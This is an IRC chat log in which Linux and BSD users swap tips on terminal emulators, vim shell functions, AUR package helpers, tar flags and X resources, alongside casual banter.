10:29       fenriz │  thang1thang2: aah i see.
10:29          evo │  thang1thang2: firefox supports a css file for styling it
10:29  thang1thang │  datnokia
10:29  thang1thang │  and yeah I thought that's what you meant, I just got tripped up by the "chrome" part :p
10:30       fenriz │  intadadesting.
10:30  thang1thang │  http://5digits.org/nightlies
10:30       fenriz │  dont wanna sound like a grouch, but if what i see on fb is what i am going to see on instragram
10:30       fenriz │  (pics of food and the like)
10:31       fenriz │  i don't think i am missing out.
10:31        z3bra │  echo ':h(){vim +h $1 +only +"map q ZQ"}' >> ~/.bashrc
10:31        z3bra │  yay
10:31  thang1thang │  nope you're not missing out at all lol
10:31  thang1thang │  half the pictures you see on facebook ARE on instagram, they just posted to both at the same time
10:31  thang1thang │  z3bra, what is that?
10:31        z3bra │  an awesome bash function
10:31  thang1thang │  fenriz: scrollback in terminal output
10:31  thang1thang │  is a feature of your terminal rather than zsh/bash/etc
10:32       fenriz │  aah
10:32       fenriz │  so i have to configure it in my termite?
10:32        z3bra │  so that you can use vim help in your terminal
10:32  thang1thang │  oooh nice
10:32       fenriz │  z3bra: come again?  all i saw is "vim" and "bash"
10:32       fenriz │  and that grabbed my interest
10:32       fenriz │  will that work for zshrc?
10:32  thang1thang │  it will
10:32        z3bra │  yep
10:32       fenriz │  so what does it do again?
10:32  thang1thang │  syntax changes should be miniscule
10:32       fenriz │  only use vim help in my terminal?
10:33        z3bra │  spawn vim with help in fullwindow
10:33        z3bra │  and remap q to quit
10:33  thang1thang │  basically
10:33  thang1thang │  if you type :help in a terminal vim now
10:33  thang1thang │  it takes up all of the current window
10:33  thang1thang │  now it takes up a new window
10:33  thang1thang │  (right?)
10:33        z3bra │  :h help
10:33        z3bra │  nope
10:33        z3bra │  it fire up vim with the argument requested
10:34  thang1thang │  uhh
10:34  thang1thang │  why would you want that, though?
10:34        z3bra │  it creates a function named ':h'
10:34        z3bra │  thang1thang2, I use vim help quite often
10:34  thang1thang │  so do I
10:34  thang1thang │  I don't even touch vim outside of a terminal. I only use vim inside a terminal now
10:34  thang1thang │  you can just type :help inside vim
10:35  thang1thang │  and it'll open a help page, it's built in
10:35        z3bra │  --'
10:35        z3bra │  sometime, i'm not in vim
10:35        z3bra │  but I want to see an help page
10:35  thang1thang │  if I'm in the terminal and I want to open up a vim help page, I just hit cmd+return (window) and then type :help
10:35  thang1thang │  it takes an extra... one second, for me?
10:35  thang1thang │  I mean, the function's cool, it just seems relatively extraneous
10:35        z3bra │  cool, then don't use my function, what's the problem ?
10:36  thang1thang │  I'm just honestly wondering why you made it if it's redundent
10:36        z3bra │  it only take one seconde to type mkdir foo; cd foo
10:36        z3bra │  but i still use my mkcd function
10:37        z3bra │  it only take one second to do cd foo; ls
10:37        z3bra │  but I still use my cd wrapper that perform 'ls' whenever I do 'cd'
10:37  thang1thang │  cd wraper? Oh, got it nvm
10:38  thang1thang │  just an alias in the .bashrc right?
10:38  thang1thang │  no that wouldn't work, nvm
10:38  thang1thang │  anyway, fenriz
10:38       fenriz │  hola
10:38  thang1thang │  ctrl shift up 
10:38  thang1thang │  is scroll up a line
10:38        z3bra │  so I prefer ":h indent" rather than vim<ENTER> -> :h indent -> :only
10:38  thang1thang │  ctrl shift down, scroll down
10:38       fenriz │  sweet, thanks thang1thang2 
10:38       fenriz │  looking at termite right now
10:39  thang1thang │  shift - pageup is scroll up a page
10:39       fenriz │  i'm thinking i need to crack it open
10:39  thang1thang │  and shift - page down is scroll down a page
10:39       fenriz │  i think it's config file isn't sufficient to change keybindings.
10:41  thang1thang │  ahhh
10:41  thang1thang │  found it
10:42  thang1thang │  your termite.1 file has the keybindings in it
10:42  thang1thang │  line 56 is .IP "\fBctrl-shift-up\fP"
10:42  thang1thang │  line 57 is: scroll up a line
10:43        z3bra │  What's cool with termite ?
10:43  thang1thang │  it's just a terminal emulator
10:43  thang1thang │  they're all pretty much the same I guess
10:44       fenriz │  has insert and command mode
10:44  thang1thang │  I don't use it atm, I'm using xterm. I'll probably switch to it or maybe another one should I find one I like better
10:44       fenriz │  other than that, it has a saner config file
10:44       fenriz │  rather than fucking with Xresources.
10:44  thang1thang │  that's pretty true, tbh
10:44       fenriz │  but thanks thang1thang2 , i really appreciated it.
10:45  thang1thang │  no problem
10:45  thang1thang │  just changing the termite.1 SHOULD be enough right there if you log in and log out
10:45       fenriz │  anyways
10:45       fenriz │  hm
10:45  thang1thang │  if not you'll just need to uninstall and reinstall super quick
10:45       fenriz │  i think i have to do that.
10:45  thang1thang │  but since termite.1 is a bunch of shortcuts
10:45       fenriz │  but that'll be very easy.
10:45  thang1thang │  you shouldn't need that upon compile
10:45  thang1thang │  it should be acting like a .rc or .init file
10:46       fenriz │  i just tried "locate termite.1"
10:46  thang1thang │  so just restarting the terminal (or since it's a term, logging in and out) should do it
10:46       fenriz │  ntohing showed up aside:
10:46       fenriz │  /usr/share/man/man1/termite.1.gz
10:46       fenriz │  not quite helpful.
10:46  thang1thang │  weird
10:46  thang1thang │  ohh
10:46       fenriz │  so even if i have a termite.1, i'll have no idea where to put it haha
10:46  thang1thang │  termite.1 is inside the directory when you clone it from git
10:46       fenriz │  i didn't clone
10:46       fenriz │  i used an AUR helper
10:47       fenriz │  haha
10:47  thang1thang │  okay
10:47  thang1thang │  that'd explain why you don't have it :p
10:47  thang1thang │  it might be inside .config
10:47       fenriz │  i will use makepkg -s and pacman -U tomorrow.
10:47  thang1thang │  actually I'd bet it's inside ~/.config ...
10:47  thang1thang │  it MIGHt be inside /etc somewhere
10:47       fenriz │  the .config only containts termite.
10:47       fenriz │  and inside terminte is a config
10:47       fenriz │  so it look slike ~/.config/termite/config
10:47       fenriz │  very boring
10:47       fenriz │  (though one of th ereasons why i switched)
10:47  thang1thang │  ah okay, nvm then. If it's not inside /etc you'll have to uninstall termite and clone it from git and install it the boring way
10:48       fenriz │  haha
10:48       fenriz │  yup
10:48       fenriz │  i will do that tomorrow
10:48       fenriz │  gonna read a bit before bed
10:48       fenriz │  toodles!
10:48  thang1thang │  that's not exactly a bad thing, though
10:48  thang1thang │  and ttyl bro
10:48       fenriz │  later!
10:48  thang1thang │  fuuck
10:48         quit │  fenriz
10:48  thang1thang │  it's almost 2am
10:48  thang1thang │  I'm supposed to wake up at 8am -_-
10:48  thang1thang │  I never did post that current image of me either lol, forgot to
10:52         quit │  evo
11:01        z3bra │  back
11:01  thang1thang │  welcome back
11:02        z3bra │  how big is the termite package ?
11:02  thang1thang │  uhm, it's fairly lightweight
11:02  thang1thang │  I don't know much more specifics sorry
11:02  thang1thang │  I do know it's one of the lighter term emulators
11:03        z3bra │  bullshit
11:03        z3bra │  It's vte based
11:03  thang1thang │  lol, you have a point there
11:03        z3bra │  so does it count the vte lib size ?
11:05  thang1thang │  It actually seems fairly light
11:05  thang1thang │  and if you don't have the vte lib installed, the vte lib would count towards the size I guess?
11:05        z3bra │  yep
11:05  thang1thang │  http://techblog.cedricgirard.com/2013/03/15/terminal-emulator-termite/
11:05        z3bra │  2Mo for vte
11:05        z3bra │  1.6 for vte3
11:05  thang1thang │  this guy went from uxrvt to termite 
11:06  thang1thang │  his biggest favorite features were "opening a new term in current directory"
11:06  thang1thang │  the command mode
11:06  thang1thang │  and scrollback search
11:06        z3bra │  i'm reading it
11:06        z3bra │  opening a new term in current  directory
11:06        z3bra │  doing right-click in nautilus, then open terminal here ? :p
11:07  thang1thang │  idk lol
11:07  thang1thang │  I don't use nautilus
11:07  thang1thang │  I don't have any sort of file browsing other than the terminal, actually
11:08        z3bra │  so that's a useless feature :)
11:08        z3bra │  I tried termite, for science
11:08  thang1thang │  for me? yeah
11:08  thang1thang │  did you like it?
11:08        z3bra │  didn't find anything interessting
11:08  thang1thang │  (which terminal do you use right now, actually?)
11:09        z3bra │  I only noticed the lack of feature I need -> url selection / visual selection
11:09        z3bra │  I use urxvt
11:09  thang1thang │  ah okay
11:09  thang1thang │  does the url/visual selection work in apps you open in terminal?
11:09  thang1thang │  (say if I open irssi in urxvt)
11:09        z3bra │  yep
11:09        z3bra │  obviously
11:10  thang1thang │  damn, that's probably what I need in order to make irssi work better for me
11:10  thang1thang │  and I was just checking
11:10  thang1thang │  seems like that might conflict almost with using vim in a terminal?
11:10        z3bra │  alt+u then HJKL to switch between url
11:10        z3bra │  alt+v to start visual mode
11:10        z3bra │  'y' to copy
11:11        z3bra │  can't live without it
11:11  thang1thang │  and pasting into the irssi chat would just be 'p' then?
11:11        dami0 │  hello
11:11  thang1thang │  How about scrollback, is that feature in urxvt?
11:11  thang1thang │  hey dami0
11:11        dami0 │  i can't use urxvt. I think the terminfo is screwed up or something
11:11  thang1thang │  what do you mean? What's stopping you from using it?
11:12        z3bra │  paasting is done with shift+insert
11:12        dami0 │  it lags the whole computer when opening it up
11:12  thang1thang │  weird...
11:12        dami0 │  I'm just gonna redo my whole install at some point. see if it fixes it
11:12        z3bra │  for scrollback, I use pgup/pgdn or tmux scrollbuffer
11:12  thang1thang │  I'll need to change the keybinds on rxvt then
11:12        z3bra │  why ?
11:12  thang1thang │  I don't have an insert button or pageup/down
11:12  thang1thang │  >macbook keyboard
11:12        z3bra │  hee
11:13        dami0 │  I think fn and arrows are pageup
11:13        dami0 │  pagedown
11:13        dami0 │  or some combination of modifiers and arrows
11:13  thang1thang │  even if I had them I wouldn't feel like taking my fingers off the homerow anyway
11:13  thang1thang │  yeah just tested it, fn arrows are pageup/down
11:13  thang1thang │  doesn't work in xterm though (nothing useful works in xterm anyway)
11:13        dami0 │  it's even embedded into the bluetooth one.
11:14        dami0 │  lel
11:14  thang1thang │  I wonder if there's a way to disable the vim mode in zsh...

11:16  thang1thang │  switching to urxvt
11:16   emptytapes │  who even uses xterm
11:16  thang1thang │  why does everything come with xterm then?
11:16        z3bra │  it's for testing purpose
11:17        z3bra │  twm + xterm + xclock 
11:17  thang1thang │  testing?
11:17        z3bra │  that was the combination used to test Xorg 
11:17  thang1thang │  ah got it
11:17        z3bra │  And that's what the default xinitrc has in it actually
11:18  thang1thang │  I don't know why I can't find my zsh configuration thing but it's bugging me so hard

11:24  thang1thang │  I'm so stupid

11:40        dami0 │  it redraws really slow

11:41  thang1thang │  did you check in your urxvt configuration files?

11:43  thang1thang │  if your urxvt is bone stock just installed it's gotta be the system then
11:44  thang1thang │  do you have libAfterimage installed?

11:46  thang1thang │  I'm on arch, it's not on there by default
11:46        dami0 │   getting it now
11:46  thang1thang │  it's only like 1MB in size but it takes a while to install it since it gets into everything
11:46  thang1thang │  that should improve redraw speed in urxvt
11:47  thang1thang │  wow...
11:47        dami0 │  nope
11:47  thang1thang │  I'm noticing a speed increase in firefox 
11:47  thang1thang │  that's cool as shit
11:47        dami0 │  huh, speeds up ff, but not urxvt
11:47  thang1thang │  firefox uses a lot of redraws

11:47  thang1thang │  libafterimage is gonna speed that up a lot
11:47       Ypnose │  hi dudes

11:48  thang1thang │  sup ypnose
11:48        dami0 │  hey
11:48  thang1thang │  know why the heck urxvt would be acting slow as shit on dami0's system?
11:48        dami0 │  thang1thang2: Ima take a shower. think about it
11:48  thang1thang │  dami0
11:48  thang1thang │  what's in your .xdefaults?
11:48        dami0 │  really freaks me out that .Xresources ain't doing anything
11:48       Ypnose │  thang1thang2: I'm in a good mood today!
11:48  thang1thang │  anything in .xdefaults can/will affect urxvt
11:48       Ypnose │  not very common
11:48  thang1thang │  maybe you have "please draw every pixel 50 times" enabled? :p
11:49        dami0 │  thang1thang2: nottin...
11:49  thang1thang │  and sweet! glad you're in a good mood ypnose
11:49        dami0 │  it's NOTTIN!
11:49  thang1thang │  I'm in a great mood but I shall be sevrely cranky when I wake up in 5 hours from now
11:49  thang1thang │  what did you put in .xresources, then?
11:50  thang1thang │  try forcing anti-alias to be off with your .xdefaults?
11:51  thang1thang │  and obviously set a font to be something that doesn't look useless with no antialias
11:56  emptytapes| │  you need to merge your Xresources dami
11:56  emptytapes| │  xrdb -merge ~/.Xresources, put that in your xinitrc and reboot X

12:08  thang1thang │  hey yrmt
12:08         yrmt │  What's up?
12:08  thang1thang │  I'm up way too fucking late
12:08  thang1thang │  it's 3am, I have to wake up at 8am

12:08         yrmt │  It ruined me
12:08  thang1thang │  I have a problem. Where's the #UnixaddictsAnonymous group?
12:08  thang1thang │  what ruined you?
12:08         yrmt │  Fucked up sleeping schedule
12:09         yrmt │  brb tea.
12:09  thang1thang │  oh blah
12:09  thang1thang │  I've had so much practice fucking up my sleep schedule
12:09  thang1thang │  by now I don't even care, like ever
12:10  thang1thang │  btw, just wondering, what term do you use yrmt?
12:11         yrmt │  urxvt, termite, iterm
12:11         yrmt │  I need to make a port of termite
12:12  thang1thang │  you use all 3?
12:13  thang1thang │  and I think I'm gonna to use urxvt, seems like it's the most complete out of everything
12:13  thang1thang │  really looking forward to url searching and copy/paste straight from keyboard :p
12:14        dami0 │  I don't run xinitrc though
12:14       Ypnose │  yrmt: hi dude
12:14        dami0 │  so, need to stick that stuff elsewhere. but the urxvt config is a mess.
12:14  thang1thang │  and dami0
12:14  thang1thang │  I would make an xinitrc just for that purpose, tbh
12:15  thang1thang │  the xinitrc executes certain commands every time X starts up
12:15        dami0 │  but does a login manages run xinitrc?
12:15  thang1thang │  otherwise you'd have to just run the command every time you started up X
12:15        dami0 │  also, don't even have xrdb
12:16  thang1thang │  xrdb should be something built into your linux distro...
12:16        dami0 │  xrdb says command not found
12:16  thang1thang │  weird ._.
12:16  thang1thang │  what's your distro?
12:17  thang1thang │  .xdefaults is like .xresources yet older and stupider apparently
12:17  thang1thang │  however .xresources requires a load via xrdb
12:18         yrmt │  Ypnose: hai
12:18        dami0 │  thang1thang2: had to download it
12:18  thang1thang │  yeah but what distro are you using?
12:18         yrmt │  .np
12:18  thang1thang │  I'm just really bugged that you had to download it
12:18  thang1thang │  xrdb is the x resources database manager...

12:19  thang1thang │  you use arch and you didn't have xrdb?

12:20  thang1thang │  wait, did you install arch with the devel stuff?
12:20        dami0 │  i did
12:20        dami0 │  yeah
12:20         yrmt │  xrdb is from X, not devel

12:20        dami0 │  yeah, it's not
12:20  thang1thang │  but it's a pre-req of X?
12:20  thang1thang │  is X not installed by default on arch?

12:37       phyrne │  What does flex do yrmt? :) I've been out of the  jb scene for sooo long
12:38         yrmt │  it lets you override some  values in obj-c classes of running processes
12:38       phyrne │  lul, yeah I'm totes gunna use that ;) That's really cool though
12:39       phyrne │  I'm using f.lux, it's so nice

12:39  thang1thang │  I need to put flux back on linux...
12:39       phyrne │  Just rsync music over, then run bridge :D
12:39         yrmt │  but I still use iTunes :p
12:40       phyrne │  Heh
12:40         yrmt │  but I'll probably stop using it soon
12:40         yrmt │  bridge allows us bsd fagets to have iphones thanks to bridge and icloud backup \o/
12:40       phyrne │  yussss
12:40         yrmt │  flex has just been updated
12:40         yrmt │  I'm afraid to update
12:41       phyrne │  I'm happy to use iTunes, but Bridge is convenient
12:41       phyrne │  :p
12:41         yrmt │  because sometimes cydia devs are pushing crashy things
12:41         yrmt │  phyrne: tfw I purchase more from cydia than the appstore
12:42       phyrne │  :p
12:42       phyrne │  Man I've missed being able to do stuff like this
12:42         yrmt │  because I can use paypal
12:42         yrmt │  phyrne: I also bought biteSMS
12:42       phyrne │  It's funny though; I didn't feel I needed to jb iOS7... but now that it's there, I love it
12:42       phyrne │  And yeah yrmt :D I used to use biteSMS yeeears ago
12:43       phyrne │  That's such a good app
12:43         yrmt │  it's there for iOS7 :)
12:43       phyrne │  Yeah, but doesn't work on a7's yet :(
12:43       phyrne │  Tried it yesterday
12:43         yrmt │  Oh right

12:46  thang1thang │  arch linux is literally about 10 times louder in my headphones on max

12:46  thang1thang │  I'm like so fucking happy right now
12:46       phyrne │  Hahaha
12:46  thang1thang │  I'm severely hard of hearing
12:46       phyrne │  Well, that's good :)
12:46  thang1thang │  this means that I'll finally be able to turn things up as loud as I fucking need it

12:47         yrmt │  there are many ways to have louder output on osx
12:47         yrmt │  googles help
12:47        kirby │  Buy load speakers.

12:48  thang1thang │  and lol that doesn't help
12:48  thang1thang │  it needs to be headphones related 
12:48        kirby │  Does it?
12:48  thang1thang │  the headphones are invaluable because I can switch my hearing aids to ignore all microphone input
12:48  thang1thang │  and only send input through the headphones
12:48        kirby │  What's wrong with placing a massive speaker next to your ear :p
12:48  thang1thang │  well this way, i don't have to turn the volume to 100 dB
12:49  thang1thang │  and I'm deaf enough that turning the hearing aid mics off
12:49  thang1thang │  means I can't hear jet engines
12:49  thang1thang │  (well, I can hear them, but barely)
12:49        kirby │  Wow.
12:49  thang1thang │  so turning that off and then piping music straight into my hearing aids means I can listen to my iPod in things like planes more comfortably than my hearing friends can
12:49  thang1thang │  which is amusing, to be honest :p

13:08  thang1thang │  that was probably the second stupidest thing I've ever done
13:08   emptytapes │  ?
13:09  thang1thang │  I was testing whether using the reload function worked on my sxhkd thing
13:09  thang1thang │  so like any smart person
13:09         yrmt │  there, updated the gtk engine
13:09  thang1thang │  I decided to test it
13:09  thang1thang │  by commenting out the "brightness increase" function
13:09         yrmt │  phyrne: I'll put the theme on pkgsrc
13:09  thang1thang │  and then I decreased the brightness one too far accidentally
13:10        kirby │  And it doesn't work?
13:10  thang1thang │  so my screen was off, with no way to turn it back on except through a terminal command I no longer memorized
13:10         yrmt │  I'll probably be the only one to use it but I hate installing through anything else than pkgin
13:10  thang1thang │  rebooting didn't work :p
13:10        kirby │  Ha :p
13:10  thang1thang │  I googled the terminal command on my phone and logged and started a terminal blind

13:27         yrmt │  yes
13:29  thang1thang │  apparently the full gtk2 gtk3 and gtk aren't installed on arch...
13:29  thang1thang │  fixed that ^^
13:30       phyrne │  Of course they wouldn't be :p Arch is supposed to be a base you build off of
13:30  thang1thang │  true
13:30   emptytapes │  i used to used arch
13:30  thang1thang │  I keep forgetting how bare bones arch is at times
13:30   emptytapes │  then it broke
13:30  thang1thang │  it didn't break
13:30  thang1thang │  you got stupid
13:30   emptytapes │  a day before i was setting up for a concert
13:30       phyrne │  No, it probably broke
13:30       phyrne │  It's Arch....

13:32  thang1thang │  what would I install for that? compiz right?
13:32        z3bra │  compton-git
13:33       phyrne │  Yeah use compton
13:33         yrmt │  z3bra: your makefiles are too gnu
13:33       phyrne │  Compiz is pretty much dead I think, plus, that'd be overkill for what you wabt
13:33       phyrne │  *want
13:33        z3bra │  yrmt, why ?
13:33  thang1thang │  true, I don't like getting bloat if I can handle it
13:33         yrmt │  because they don't work with bsd make
13:33       phyrne │  compton is a fork of the classic X compositing manager, with a bunch of fixes and improvements
13:34  thang1thang │  sweet
13:34        z3bra │  yrmt, what's the error .
13:34        z3bra │  ?
13:34        dami0 │  z3bra: because they don't work
13:34        dami0 │  hue hue. jk
13:34        z3bra │  i'll be glad to fix it
13:34  thang1thang │  should I get compton from the AUR or get it off of git and build it the old fashioned way?
13:34         yrmt │  I fixed it :p
13:34        z3bra │  AUR
13:34        dami0 │  too pretty and too much code these guys say
13:34       phyrne │  thang1thang2: AUR
13:34        dami0 │  but ioup still segfaults for me
13:34        z3bra │  what was wrong ?
13:34        dami0 │  i dunno it segfaults
13:34        z3bra │  I mean, for the makefile
13:34  thang1thang │  okay. some stuff is far better to install from git over AUR
13:34        z3bra │  dami0, just valgrind
13:34       phyrne │  thang1thang2: If you have the choice between package management and building from source, go with package management, always
13:34         yrmt │  z3bra: http://git.unixhub.net/dcat/ioup/commit/b8e0adf98470d6e8c0e1cb36663d2ca4374564d5
13:35        dami0 │  valgrind's for memory
13:35  thang1thang │  but considering all the dependencies... AUR is nice
13:35        z3bra │  thang1thang2, exemple ?
13:35       phyrne │  ^ this
13:35        z3bra │  I'll be glad to tear you down :p
13:35       phyrne │  :p
13:35       phyrne │  I'm curious....
13:35  thang1thang │  any shit like dwm where you have to recompile every damn time you change a setting
13:35        dami0 │  sigsegv
13:35        dami0 │  it's dem arrays
13:35        z3bra │  thang1thang2, just learn how to AUR
13:35        dami0 │  ==14221== Conditional jump or move depends on uninitialised value(s)
13:35        dami0 │  ==14221== Use of uninitialised value of size 8
13:35       phyrne │  yis
13:36        dami0 │  i bet it's a pointer bein broke
13:36  thang1thang │  you can use the AUR and customize a .c file before it makes? While using something like pacaur?
13:36        z3bra │  it is
13:36        z3bra │  cower
13:36        z3bra │  for your own sake
13:36        dami0 │  thang1thang2: use aura
13:36        dami0 │  or just be all manlike and wget + makepkg -si
13:37  thang1thang │  aura's better than pacaur?
13:37        z3bra │  wget is hard
13:37        z3bra │  use cower
13:37       phyrne │  lul wget
13:37        z3bra │  to download/extract the tarball
13:37        z3bra │  then, makepkg
13:37        dami0 │  wget is hard?
13:37        dami0 │  it's just wget 'url string'
13:37        z3bra │  yrmt, BSD make does not handle implicit rules ?
13:37         yrmt │  nope
13:38        z3bra │  dami0, cause you don't always know what to download
13:38        z3bra │  yrmt, good to know
13:38         yrmt │  brb, fishticks
13:38         yrmt │  :D
13:38  thang1thang │  uhh, cower is also a AUR manager? So should I use aura or cower? ._.
13:38        z3bra │  yrmt, %.o:%.c should be fine then
13:38       phyrne │  yrmt: You like fishsticks?
13:38        z3bra │  thang1thang2, as you wish
13:38        z3bra │  cower does not handle dependencies
13:38        z3bra │  hence, does not install crap on your desktop
13:39  thang1thang │  but if they're dependencies, shouldn't you need them?
13:39       phyrne │  Back when I used Arch, I used owl, by Baskerville :) It's very nice. I think he's done 'owl 2' now, haven't looked at it
13:39        z3bra │  yrmt, then the makefile was only wrong because of the implicit rule
13:39        dami0 │  z3bra: what?
13:39        dami0 │  you download the tarball
13:40        z3bra │  so then, .SUFFIXES is useless here
13:40        dami0 │  just get the link from the download tarball button
13:40        z3bra │  so you need the web browser then
13:40        dami0 │  well, yeah. that's like, the only shortcoming
13:41        z3bra │  that's the only reason I use cower
13:41        z3bra │  make searching easier
13:41        dami0 │  oh, I figure, I already have a browser, might as well not bloat.
13:41  thang1thang │  on the arch wiki
13:41  thang1thang │  it explicitly says cower installs dependencies
13:41        dami0 │  it's all right, you can use 'bible' for short.
13:42        z3bra │  thang1thang2, sauce
13:42        z3bra │  because it does not
13:42  thang1thang │  https://wiki.archlinux.org/index.php/AUR_Helpers
13:42        z3bra │  cower doesn't even install the package
13:42        z3bra │  wuuuut?!
13:42  thang1thang │  "fast and simple aur search and download agent which will also check for updates and install dependencies"
13:42        z3bra │  man cower
13:42        z3bra │  ehh
13:42        z3bra │   Pass this option twice to fetch dependencies (done
13:42        z3bra │             recursively).
13:43        z3bra │  TIL cower can fetch dependencies oO
13:44  thang1thang │  cower has a couple options. -d just downloads -s just searches -u updates -f overwrites files when downloading
13:44  thang1thang │  if you pass d twice, it fetches dependencies
13:44        z3bra │  I know the cower options
13:44        z3bra │  I just learnt for -dd
13:45         quit │  trgc

13:46  thang1thang │  huh
13:46  thang1thang │  pacaur is basically cower w/stuff slightly modified
13:47        z3bra │  nope
13:47  thang1thang │  well, it uses cower as a backend
13:47        z3bra │  it just goes more far in the installation process
13:47        z3bra │  (farer ? can I say that?)
13:48  thang1thang │  farther would be the word in english
13:48  thang1thang │  it goes "farther"
13:48        z3bra │  mmmh yeah
13:48  thang1thang │  english is dumb like that
13:48  thang1thang │  further is also used and the difference between farther and further has to do with nouns or something, idek
13:48        dami0 │  further and farther are both words
13:49        z3bra │  Anyway, I suggest you use cower until you're familiar with installing packages from AUR
13:49       phyrne │  off to le gym, back in a bit
13:49        dami0 │  which mean near exactly the same thing

13:49  thang1thang │  I can install packages from AUR manually
13:49        dami0 │  'atta boy
13:49        z3bra │  don't install too much of 'em
13:52  thang1thang │  the only thing I always fuck up on is I can never remember which 3 options to use with tar to make it easy. It's -xzf
13:52  thang1thang │  but I can never remember that, I always think it's -zxj or -zxh or -zxt or something
13:52        dami0 │  -xf 
13:52        dami0 │  it just dumps contents into .
13:53  thang1thang │  the z dumps contents into a new folder right?
13:53        dami0 │  tar -xf bleh.tar.gz && rm bleh.tar.gz && cd bleh && makepkg -si
13:53        dami0 │  thang1thang2: the AUR ones already have a folder as bsae
13:53        dami0 │  so for those I don't bother with z
13:53  thang1thang │  ah okay makes sense
13:53        z3bra │  always use -f, use -z for compression, -x to Xtract, -c to Create
13:53        z3bra │  then, -v to make it verbose
13:53        z3bra │  that's how I remember tar
13:54        dami0 │  there's always the thing no one wants to do
13:54  thang1thang │  sweet thanks, that'll help
13:54        dami0 │  man tar
13:54  thang1thang │  lol
13:54        dami0 │  hueh
13:54        kirby │  I just use -xvf
13:54        kirby │  Every time.
13:54  thang1thang │  I do that, but it's just a weeee bit pain in the ass to do that every time because I can't remember the command quite right

13:57  thang1thang │  okay bedtiem

13:58  thang1thang │  next on todo list, get my bar working for once
13:58  thang1thang │  and swap over to urxvt
13:58        dami0 │  I might remove my bar
13:58  thang1thang │  actually I'll do that last one real quick

14:33         yrmt │  lol z3bra, what's that jumping game
14:33  thang1thang │  quake 3: Bunnyhopping
14:33        z3bra │  kinda
14:33        z3bra │  that's the defrag mod
14:33         yrmt │  it's weird
14:33        z3bra │  it's a race
14:34  thang1thang │  is quake the game where they had the glitch that if you jump ran you went faster?
14:34        z3bra │  And you can use the weapons to go faster
14:34        z3bra │  thang1thang2, OB jump
14:34  thang1thang │  OB?
14:34         yrmt │  dcat: is it okay if I make a branch of ioup for my big changes?
14:35         yrmt │  z3bra.org is down
14:35  thang1thang │  z3bra: Your Lost Art of C Structures is a pdf file that you're reading on the desktop?
14:35        z3bra │  thang1thang2, a web page
14:35        z3bra │  I have 2 tabs openned
14:35  thang1thang │  okay, I thought it might be
14:35        dami0 │  yrmt: yeh
14:36        z3bra │  yrmt, yeah I know :/
14:36  thang1thang │  How'd you get the webpage to look so pretty at such a small size?
14:36        z3bra │  It went down in the morning, no idea why
14:36        z3bra │  I'll check when I'm back home
14:36         yrmt │  dami0: alright
14:36  thang1thang │  and the this is a motherloving website is a webpage opened in a textbrowser?
14:36        z3bra │  thang1thang2, I browse well done websites
14:37        z3bra │  and no, it's not. The 21 first lines are dumped using links
14:37        z3bra │  you can still see the command
14:37  thang1thang │  yeah, I saw the command
14:37  thang1thang │  I just didn't know links would get text so nicely
14:38        z3bra │  hehe
14:38        z3bra │  links is gud
14:38  thang1thang │  I naively though links was for just links :p
14:38  thang1thang │  but that yellow bar for your prompt thing is genius and glorious
14:38  thang1thang │  I'm assuming instagram img.png is a script you ran for the screenshot?
14:39        z3bra │  yep
14:39        z3bra │  a wrapper for import
14:39        z3bra │  and a few more things
14:39  thang1thang │  nice
14:39  thang1thang │  I have import and scrot installed on my computer
14:39  thang1thang │  but I haven't gotten around to getting a script and hotkeying it to anything pretty to automate uploading images
14:39  thang1thang │  I really should do that because imgur.com doesn't seem to work unless I have an actual file browser...
14:39        z3bra │  like uploading to my website (which is down today), taking gifs, choosing between monitors, etc
14:40        z3bra │  thang1thang2, you don't need a file browser oO
14:40  thang1thang │  then why is imgur not working ;-;
14:40  thang1thang │  ...
14:40  thang1thang │  it's working _now_
14:40  thang1thang │  dunno why it wasn't three hours ago >_>
14:42  thang1thang │  http://imgur.com/T9jCpA6
14:42  thang1thang │  le desktop de shit
14:42  thang1thang │  only it's even worse now because I quit the login manager so the background is black
14:43  thang1thang │  and I'm using urxvt 100% stock 'cause I'm too lazy to change config files at 5:40am
14:43  thang1thang │  so I have an ugly grey scrollbar on all my windows
14:43        z3bra │  URxvt*scrollbar: false
14:44  thang1thang │  don't you have to put that into the config files or it'll reset every time you login?
14:45        z3bra │  that's for you Xresource file
14:45  thang1thang │  ah okay
14:46        z3bra │  *your
14:49  thang1thang │  I like how toilet's rainbow color setting
14:49  thang1thang │  is -gay
14:50        z3bra │  --gay in fact
14:50        z3bra │  ;p
14:50  thang1thang │  -gay works for me ;-;
14:50  thang1thang │  oh nvm. just gay w/no - or " works if I have the -F option in front of it w/ the text outputted in double quotes
14:51  thang1thang │  it's a shame toilet doesn't have a proper line wrap
14:52        dami0 │  wth is toilet?
14:52  thang1thang │  it's an small output program
14:52  thang1thang │  you type toilet --gay "text here"
14:52  thang1thang │  and it'll echo your text in large font with rainbow colors
14:52        dami0 │  oh
14:53  thang1thang │  figlet does the same thing
14:53  thang1thang │  but no colors, and it's just an outline of the text made with a bunch of pipe symbols
14:53  thang1thang │  nvm, it's a combo of pipe symbols,and - symbols
14:53  thang1thang │  but anyway

15:30        bosko │  the problem with the bsd userbase
15:30        bosko │  is that the bsd users beleive they have "graduated" from linux
15:30        bosko │  and that bsd is some sort of higher state of *nixing
15:30        dami0 │  z3bra: we can do a lot of things 
15:30        dami0 │  we just don't want to
15:31         yrmt │  bosko: wut
15:31       phyrne │  bosko: That's generalizing.... perhaps some newcomers feel that way
15:31       phyrne │  But it quickly subsides
15:31         yrmt │  for devices drivers maybe, but NetBSD supports way more architectures.
15:31        bosko │  yeah normally the noobs
15:31       phyrne │  yrmt: indeedy ;)
15:31        z3bra │  dami0, okay.
15:31        bosko │  netbsd didnt run on my laptop
15:31        bosko │  therefore i just gave up

19:54        tbuck │  glorious coffee
19:55   emptytapes │  tea > coffee
19:55        tbuck │  eh opinions as usual
19:56        tbuck │  i also dont know where to get good tea around here, only really good coffee
19:56      bottomy │  it's a trick question, good tea doesn't exist
19:59         BigE │  i had good tea once.
19:59         BigE │  Once.
19:59        tbuck │  lol
20:00        dami0 │  wassup?
20:01        tbuck │  gettin my fix
20:01      bottomy │  I've never had good tea before, but maybe that's because I don't like it, but maybe I don't like it cause I've never had any good tea before. :P
20:01        tbuck │  didnt have any caffeine yesterday and my head felt it
20:01        dami0 │  itc: caffeine addiction 
20:02        tbuck │  maybe ill get ambitious and finally install this SSD
20:02        tbuck │  i just really dont want to reinstall all of my software
20:02        dami0 │  damn, you're gettin on a level now

20:03         BigE │  seriously
20:03         BigE │  do it
20:03         BigE │  so worth it
20:03        tbuck │  well im on that hybrid drive now
20:03     Ampharos │  what is?
